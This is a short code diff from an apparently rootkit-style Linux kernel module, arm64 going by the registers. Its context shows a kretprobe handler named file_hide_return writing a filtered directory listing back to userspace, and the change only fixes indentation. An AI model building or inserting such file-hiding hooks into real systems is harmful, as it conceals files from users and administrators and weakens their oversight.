@@ -131,8 +131,8 @@ static int file_hide_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 
 	/* Write filtered buffer back to userspace and fix return value */
 	if (copy_to_user(dirp, kbuf, total_bytes)) {
-	kfree(kbuf);
-	return 0;
+		kfree(kbuf);
+		return 0;
 	}
 
 	regs->regs[0] = total_bytes;
